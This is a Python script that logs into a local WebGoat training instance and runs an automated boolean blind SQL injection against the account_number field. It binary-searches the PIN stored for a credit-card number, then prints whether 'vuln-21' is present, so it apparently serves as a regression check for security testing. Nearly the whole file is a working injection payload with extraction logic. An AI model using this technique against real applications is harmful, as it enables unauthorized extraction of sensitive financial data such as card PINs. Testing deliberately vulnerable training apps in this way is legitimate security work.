import requests as req

### Request Login Page ###
### Log into WebGoat ###
url_base = 'http://127.0.0.1:8080/WebGoat/'
login_url = url_base + 'j_spring_security_check'
home_url = url_base + 'welcome.mvc'
menu_url = url_base + 'lessonmenu.mvc'

# login_url = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'
s = req.session()
login_data = dict(username='guest', password='guest')

r = s.post(login_url, login_data)

r2 = s.get(menu_url)
#need to call /dev/null
r3 = s.get(menu_url)

### Figure out which menu item is "Http Basics" ###
# get /service/lessonmenu.mvc
menu = s.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')

BlindScreenNumber = menu.text.find("Blind")  ### 10434

#parse through JSON to find our VULN 
ScreenNumber = (menu.text[97+BlindScreenNumber:101+BlindScreenNumber])  

vulnPage =('http://127.0.0.1:8080/WebGoat/attack?Screen='+ScreenNumber+'&menu=1100')
vulnMenu = s.get(vulnPage)

####

input = 1000;
f_input = input;
syntax = "101 AND ((SELECT pin FROM pins WHERE cc_number = 1111222233334444)"
than = "<" 
f_input = str(f_input)
attack_input = syntax + than + f_input + ")";

text = dict(account_number=attack_input)
vulnPost = s.post(vulnPage, text)
#ignore = raw_input('click to proceed')


result = vulnPost.text.find("Invalid") 

lower_bound = 0;
upper_bound = 0;
while upper_bound <= 0:
    f_input = str(f_input)
    attack_input = syntax + than + f_input + ")";
    text = dict(account_number = attack_input);
    vulnPost = s.post(vulnPage, text);
    result = vulnPost.text.find("Invalid");
    if(result == -1):
        upper_bound = int(f_input)
    else:
        lower_bound = int(f_input)
        f_input = int(f_input) * 10  
success = 0
while(success == 0):
    mid = ((upper_bound + lower_bound) / 2)
    mid = str(mid)
    than = "<"
    attack_input = syntax + than + mid + ")";
    text = dict(account_number = attack_input);
    vulnPost = s.post(vulnPage, text);
    result = vulnPost.text.find("Invalid")
    than = ">"
    attack_input = syntax + than + mid + ")"
    text = dict(account_number = attack_input);
    vulnPost = s.post(vulnPage, text)
    result2 = vulnPost.text.find("Invalid")
    mid = int(mid)
    result_error = vulnPost.text.find("error")
    if(result_error != -1):
        print "vuln-21 is NOT present"
        success = 1
        exit(0)
    elif(result == -1):
        upper_bound = mid
    elif(result2 == -1):
        lower_bound = mid
    else:
        success = 1
text = dict(account_number = mid)
vulnPost = s.post(vulnPage, text)
result = vulnPost.text.find("Congratulations")
 
if(result != -1): 
    print "vuln-21 is present. Attack Successful";
    exit(1)
else:             #print out green when fixed
    print "vuln-21 is NOT present";
    exit(0)
    
